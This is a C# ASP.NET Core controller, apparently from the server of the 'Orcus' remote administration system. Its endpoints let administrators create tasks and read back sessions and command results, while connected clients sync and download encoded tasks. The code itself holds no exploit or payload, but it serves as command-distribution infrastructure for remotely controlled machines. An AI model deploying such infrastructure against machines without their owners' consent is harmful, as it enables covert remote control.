using System;
using System.Linq;
using System.Threading.Tasks;
using AutoMapper;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.DependencyInjection;
using Orcus.Server.Connection.Utilities;
using Orcus.Server.Library.Controllers;
using Orcus.Server.Library.Utilities;
using Tasks.Infrastructure.Core;
using Tasks.Infrastructure.Core.Dtos;
using Tasks.Infrastructure.Management;
using Tasks.Infrastructure.Management.Data;
using Tasks.Infrastructure.Server.Business;
using Tasks.Infrastructure.Server.BusinessDataAccess;
using Tasks.Infrastructure.Server.Core;

namespace Tasks.Infrastructure.Server.Controllers
{
    [Route("Tasks.Infrastructure/v1/[controller]")]
    public class TasksController : BusinessController
    {
        [HttpPost]
        [Authorize("admin")]
        public async Task<IActionResult> CreateTask([FromServices] ITaskComponentResolver taskComponentResolver,
            [FromServices] IXmlSerializerCache serializerCache, [FromServices] IOrcusTaskManager taskManager)
        {
            var orcusTask = new OrcusTaskReader(Request.Body, taskComponentResolver, serializerCache);
            var task = orcusTask.ReadTask();

            await taskManager.AddTask(task);

            return Ok();
        }

        [HttpGet("sync")]
        public async Task<IActionResult> GetSyncInfo([FromServices] IGetTaskSyncInfo getTaskSyncInfo)
        {
            if (User.IsAdministrator())
                return BadRequest();

            var tasks = await getTaskSyncInfo.BizActionAsync(User.GetClientId());
            return BizActionStatus(getTaskSyncInfo, () => Ok(tasks));
        }

        [HttpGet]
        public async Task<IActionResult> GetTasks([FromServices] ITaskDirectory taskDirectory, [FromServices] IOrcusTaskManager taskManager)
        {
            var tasks = await taskDirectory.LoadTasks();
            var infos = tasks.Select(x => new TaskInfoDto
            {
                Name = x.Name, Id = x.Id, Commands = x.Commands.Count, IsActive = taskManager.LocalActiveTasks.Any(y => y.OrcusTask.Id == x.Id)
            });

            return Ok(infos);
        }

        [HttpGet("{taskId}")]
        public async Task GetTask(Guid taskId, [FromServices] ITaskDirectory taskDirectory)
        {
            if (!User.IsAdministrator())
            {
                var action = HttpContext.RequestServices.GetRequiredService<ICreateTaskTransmissionAction>();
                await action.BizActionAsync(new TaskTransmission {TargetId = User.GetClientId(), CreatedOn = DateTimeOffset.UtcNow});
            }

            byte[] encodedTask;
            try
            {
                encodedTask = await taskDirectory.GetEncodedTask(taskId);
            }
            catch (Exception)
            {
                await BadRequest("The task was not found.").ExecuteResultAsync(ControllerContext);
                return;
            }

            Response.StatusCode = StatusCodes.Status200OK;
            await Response.Body.WriteAsync(encodedTask, 0, encodedTask.Length);
        }

        [HttpGet("{taskId}/sessions"), Authorize("admin")]
        public async Task<IActionResult> GetTaskSessions(Guid taskId, [FromServices] ITaskReferenceDbAccess dbAccess)
        {
            var result = new TaskSessionsInfo
            {
                Sessions = (await dbAccess.GetSessions(taskId)).Select(Mapper.Map<TaskSessionDto>).ToList(),
                Executions = (await dbAccess.GetExecutions(taskId)).Select(Mapper.Map<TaskExecutionDto>).ToList(),
                Results = (await dbAccess.GetCommandResults(taskId)).Select(Mapper.Map<CommandResultDto>).ToList()
            };

            return Ok(result);
        }
    }
}